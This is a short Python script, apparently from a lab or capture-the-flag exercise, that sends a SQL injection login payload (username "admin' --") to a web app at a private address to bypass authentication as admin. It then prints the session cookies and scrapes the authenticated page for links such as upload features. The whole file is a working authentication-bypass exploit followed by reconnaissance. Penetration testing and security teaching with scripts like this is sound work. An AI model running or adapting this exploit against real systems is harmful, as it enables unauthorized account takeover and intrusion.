import requests

target_login = "http://192.168.0.28:3000/login"
target_home = "http://192.168.0.28:3000/"

# SQLi Payload to login as admin
payload = {
    'username': "admin' --",
    'password': "password" 
}

s = requests.Session()

print("Attempting to login via SQLi...")
res = s.post(target_login, data=payload)

print(f"Login Status: {res.status_code}")
print("Cookies:", s.cookies.get_dict())

# Check home page for new links
res_home = s.get(target_home)
print("\n--- Home Page Content (Authenticated) ---")
# Simple check for keywords
if "Upload" in res_home.text or "file" in res_home.text or "admin" in res_home.text:
    print("Potential keywords found in authenticated page:")
    # Extract links again roughly
    for line in res_home.text.splitlines():
         if "href" in line:
             print(line.strip())
else:
    print("No obvious new keywords found. Dumping links anyway:")
    for line in res_home.text.splitlines():
         if "href" in line:
             print(line.strip())
